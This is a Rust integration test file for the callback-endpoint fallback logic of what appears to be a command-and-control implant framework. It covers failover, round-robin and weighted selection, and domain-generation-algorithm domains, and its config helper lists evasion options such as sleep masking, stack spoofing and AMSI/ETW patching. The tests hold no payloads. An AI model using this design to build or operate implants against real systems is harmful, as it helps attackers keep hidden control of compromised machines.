// tests/test_fallback.rs — Integration tests for FallbackManager strategies.
//
// These tests run as Rust integration tests (`cargo test --test test_fallback`)
// and cover the full public surface of FallbackManager with all four strategies
// plus DGA injection.
//
// Unlike the unit tests in src/agent/fallback.rs (which test internals directly),
// these tests use only the public API and are structured as black-box scenarios.

use rcm::agent::fallback::FallbackManager;
use rcm::common::{
    C2Config, DgaConfig, FallbackConfig, FallbackEndpoint, FallbackStrategy,
    MalleableProfile, ProxyConfig, TransportProtocol,
};

// ── Helpers ───────────────────────────────────────────────────────────────────

fn ep(host: &str, port: u16, priority: u32) -> FallbackEndpoint {
    FallbackEndpoint {
        host: host.into(), port, priority,
        transport: TransportProtocol::Tls,
        profile: None, proxy: None,
        weight: 1, max_failures: 3,
    }
}

fn ep_weighted(host: &str, weight: u32) -> FallbackEndpoint {
    FallbackEndpoint {
        host: host.into(), port: 443, priority: 0,
        transport: TransportProtocol::Tls,
        profile: None, proxy: None,
        weight, max_failures: 3,
    }
}

fn make_config(endpoints: Vec<FallbackEndpoint>, strategy: FallbackStrategy) -> C2Config {
    C2Config {
        transport: TransportProtocol::Tls,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig { endpoints, strategy, dead_time_secs: 5 },
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: "default.com".into(),
        build_id: "test".into(),
        tunnel_port: 4443,
        sleep_interval: 5,
        jitter_min: 0, jitter_max: 0,
        bloat_mb: 0, debug: false,
        kill_date: None,
        challenge_key: String::new(),
        sni_override: None,
        alpn_protocols: vec![],
        hibernation_mode: false,
        task_batch_size: 10,
        dga: None,
        valid_parents: Vec::new(),
        sleep_mask: "ekko".to_string(),
        indirect_syscalls: true,
        stack_spoof: true,
        patch_amsi_etw: true,
        heap_encrypt: true,
        guard_domain: String::new(),
        guard_hostname: String::new(),
        guard_hour_start: 0,
        guard_hour_end: 0,
        guard_no_system: false,
    }
}

// ── No-fallback (primary only) ────────────────────────────────────────────────

#[test]
fn no_fallback_uses_primary() {
    let c = make_config(vec![], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    let r = mgr.next_endpoint(&c).unwrap();
    assert_eq!(r.host, "default.com");
    assert_eq!(r.port, 4443);
}

// ── Priority strategy ─────────────────────────────────────────────────────────

#[test]
fn priority_picks_lowest_number_first() {
    let c = make_config(vec![
        ep("backup.com", 8443, 10),
        ep("primary.com", 443, 0),
        ep("emergency.com", 9443, 100),
    ], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    assert_eq!(mgr.next_endpoint(&c).unwrap().host, "primary.com");
}

#[test]
fn priority_falls_to_next_after_max_failures() {
    let c = make_config(vec![
        ep("primary.com", 443, 0),
        ep("backup.com", 8443, 10),
    ], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    let r = mgr.next_endpoint(&c).unwrap();
    assert_eq!(r.host, "primary.com");
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    mgr.record_failure(r.index); // max_failures=3 → dead
    assert_eq!(mgr.next_endpoint(&c).unwrap().host, "backup.com");
}

#[test]
fn priority_returns_to_primary_after_dead_window_expires() {
    // Uses dead_time_secs=5; we can't sleep in tests, but we can verify the
    // manager doesn't permanently exclude an endpoint — it must return something.
    let c = make_config(vec![ep("only.com", 443, 0)], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    mgr.record_failure(0);
    mgr.record_failure(0);
    mgr.record_failure(0); // dead
    // After all-dead reset, should still return the sole endpoint
    let r = mgr.next_endpoint(&c);
    assert!(r.is_some(), "manager must return an endpoint even when all are dead");
}

// ── Round-robin strategy ──────────────────────────────────────────────────────

#[test]
fn round_robin_cycles() {
    let c = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
        ep("c.com", 443, 0),
    ], FallbackStrategy::RoundRobin);
    let mut mgr = FallbackManager::from_config(&c);
    let hosts: Vec<_> = (0..6).map(|_| mgr.next_endpoint(&c).unwrap().host.clone()).collect();
    assert_eq!(&hosts[..3], &["a.com", "b.com", "c.com"]);
    assert_eq!(&hosts[3..], &["a.com", "b.com", "c.com"]);
}

#[test]
fn round_robin_skips_dead_endpoints() {
    let c = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
        ep("c.com", 443, 0),
    ], FallbackStrategy::RoundRobin);
    let mut mgr = FallbackManager::from_config(&c);
    let _a = mgr.next_endpoint(&c).unwrap();
    let b  = mgr.next_endpoint(&c).unwrap();
    assert_eq!(b.host, "b.com");
    mgr.record_failure(b.index);
    mgr.record_failure(b.index);
    mgr.record_failure(b.index); // b dead
    let next = mgr.next_endpoint(&c).unwrap();
    assert_eq!(next.host, "c.com");
}

// ── Failover strategy ─────────────────────────────────────────────────────────

#[test]
fn failover_sticks_to_primary_while_healthy() {
    let c = make_config(vec![
        ep("primary.com", 443, 0),
        ep("backup.com", 443, 1),
    ], FallbackStrategy::Failover);
    let mut mgr = FallbackManager::from_config(&c);
    for _ in 0..5 {
        let r = mgr.next_endpoint(&c).unwrap();
        assert_eq!(r.host, "primary.com");
        mgr.record_success(r.index);
    }
}

#[test]
fn failover_permanently_moves_to_backup_after_primary_dies() {
    let c = make_config(vec![
        ep("primary.com", 443, 0),
        ep("backup.com", 443, 1),
    ], FallbackStrategy::Failover);
    let mut mgr = FallbackManager::from_config(&c);
    let r = mgr.next_endpoint(&c).unwrap();
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    mgr.record_failure(r.index);
    // Subsequent calls should all use backup
    for _ in 0..5 {
        assert_eq!(mgr.next_endpoint(&c).unwrap().host, "backup.com");
    }
}

// ── Random strategy ───────────────────────────────────────────────────────────

#[test]
fn random_selects_only_live_endpoints() {
    let c = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
    ], FallbackStrategy::Random);
    let mut mgr = FallbackManager::from_config(&c);
    for _ in 0..50 {
        let h = mgr.next_endpoint(&c).unwrap().host;
        assert!(h == "a.com" || h == "b.com", "unexpected host: {h}");
    }
}

#[test]
fn random_weighted_heavily_favours_high_weight() {
    // 99:1 weighting — in 200 draws, a.com should appear ≥ 150 times.
    let c = make_config(vec![
        ep_weighted("a.com", 99),
        ep_weighted("b.com", 1),
    ], FallbackStrategy::Random);
    let mut mgr = FallbackManager::from_config(&c);
    let a_count = (0..200)
        .filter(|_| mgr.next_endpoint(&c).unwrap().host == "a.com")
        .count();
    assert!(a_count >= 150,
        "high-weight endpoint appeared only {a_count}/200 times");
}

// ── Failure / success tracking ────────────────────────────────────────────────

#[test]
fn all_dead_resets_and_returns_endpoint() {
    let c = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 0),
    ], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    for i in 0..2 {
        mgr.record_failure(i);
        mgr.record_failure(i);
        mgr.record_failure(i);
    }
    assert!(mgr.next_endpoint(&c).is_some(), "must return endpoint after all-dead reset");
}

#[test]
fn record_success_clears_failure_counter() {
    let c = make_config(vec![ep("host.com", 443, 0)], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    mgr.record_failure(0);
    mgr.record_failure(0); // 2 of 3
    mgr.record_success(0); // reset to 0
    mgr.record_failure(0);
    mgr.record_failure(0); // 2 of 3 again — still alive
    let r = mgr.next_endpoint(&c).unwrap();
    assert_eq!(r.host, "host.com");
}

// ── Per-endpoint overrides ────────────────────────────────────────────────────

#[test]
fn per_endpoint_profile_override() {
    let custom = MalleableProfile {
        name: "custom".into(),
        user_agent: "CustomAgent/1.0".into(),
        ..MalleableProfile::default()
    };
    let c = make_config(vec![FallbackEndpoint {
        host: "custom.com".into(), port: 443,
        transport: TransportProtocol::Https,
        profile: Some(custom), proxy: None,
        priority: 0, weight: 1, max_failures: 3,
    }], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    let r = mgr.next_endpoint(&c).unwrap();
    assert_eq!(r.profile.name, "custom");
    assert_eq!(r.profile.user_agent, "CustomAgent/1.0");
}

// ── DGA integration ───────────────────────────────────────────────────────────

#[test]
fn dga_generates_valid_endpoints() {
    let mut c = make_config(vec![], FallbackStrategy::Priority);
    c.dga = Some(DgaConfig {
        seed: 0xC0FFEE, window_secs: 86400,
        count: 8, tlds: vec!["com".into(), "net".into()],
        max_failures_per_domain: 2,
    });
    let mut mgr = FallbackManager::from_config(&c);
    let r = mgr.next_endpoint(&c).unwrap();
    assert!(r.host.contains('.'), "DGA domain should contain a dot: '{}'", r.host);
    let tld = r.host.split('.').last().unwrap();
    assert!(["com", "net"].contains(&tld), "unexpected TLD '{tld}'");
}

#[test]
fn dga_endpoints_come_after_static_endpoints() {
    let mut c = make_config(vec![ep("static.com", 443, 0)], FallbackStrategy::Priority);
    c.dga = Some(DgaConfig {
        seed: 99, window_secs: 86400,
        count: 5, tlds: vec!["io".into()],
        max_failures_per_domain: 2,
    });
    let mut mgr = FallbackManager::from_config(&c);
    // First pick must be the static endpoint (priority 0 < DGA priority ≥ 100)
    assert_eq!(mgr.next_endpoint(&c).unwrap().host, "static.com");
}

#[test]
fn dga_different_seeds_produce_different_sets() {
    let mut c1 = make_config(vec![], FallbackStrategy::Priority);
    c1.dga = Some(DgaConfig { seed: 1, window_secs: 86400, count: 10,
        tlds: vec!["com".into()], max_failures_per_domain: 3 });
    let mut c2 = make_config(vec![], FallbackStrategy::Priority);
    c2.dga = Some(DgaConfig { seed: 2, window_secs: 86400, count: 10,
        tlds: vec!["com".into()], max_failures_per_domain: 3 });

    let mut mgr1 = FallbackManager::from_config(&c1);
    let mut mgr2 = FallbackManager::from_config(&c2);
    let h1 = mgr1.next_endpoint(&c1).unwrap().host;
    let h2 = mgr2.next_endpoint(&c2).unwrap().host;
    assert_ne!(h1, h2, "different seeds must produce different first domains");
}

#[test]
fn no_dga_config_is_transparent() {
    let c = make_config(vec![ep("only.com", 443, 0)], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    assert_eq!(mgr.next_endpoint(&c).unwrap().host, "only.com");
}

// ── Status summary ─────────────────────────────────────────────────────────────

#[test]
fn status_summary_contains_all_hosts() {
    let c = make_config(vec![
        ep("a.com", 443, 0),
        ep("b.com", 443, 1),
    ], FallbackStrategy::Priority);
    let mut mgr = FallbackManager::from_config(&c);
    mgr.record_success(0);
    mgr.record_failure(1);
    let s = mgr.status_summary();
    assert!(s.contains("a.com") && s.contains("b.com"));
    assert!(s.contains("OK") && s.contains("DEGRADED"));
}
